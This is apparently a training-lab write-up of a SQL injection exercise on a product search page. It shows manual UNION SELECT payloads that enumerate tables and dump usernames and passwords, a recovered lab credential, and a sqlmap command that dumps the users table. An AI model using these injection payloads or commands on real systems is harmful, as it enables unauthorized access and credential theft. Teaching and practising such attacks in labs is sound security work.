## **Overview**

We have 2 ways to do this :D

Manually using the **UNION SELECT** query or using `sqlmap`

***
## **Manually**


We are giving a product page with the search functionality

Using this query in the search bar - `senpai' or 1=1#` we got back all the lists of product

we can then advance our query by using **UNION SELECT**, like we said in the past modules, keep adding `null` till something clicks, this time we needed 4 nulls

```
senpai' union select null,null,null,null#
```

We can then attempt to get all tables from this database by using the query as shown below

```
senpai' union select null,null,null,table_name from information_schema.tables#
```

Searching for **injection0x03** gives us a `_users` and `_products` table

We can then attempt to dump the content of this table, After much enumeration, i found out the **injection0x03_users** has only two columns which is `username` and password, Using the following queries we can dump them out

```sql
senpai' union select null,null,null,username from injection0x03_users#
```

```
senpai' union select null,null,null,password from injection0x03_users#
```

So definitely, our Username and password is `takeshi:onigirigadaisuki`


## **SQLMAP**


As usual intercept your request in burp and save it to a `.txt` file

On your command line run this and you should have the `injection0x03_users` table dumped

```bash
$ sqlmap -r request.txt --level=2 --dump -T injection0x03_users
```
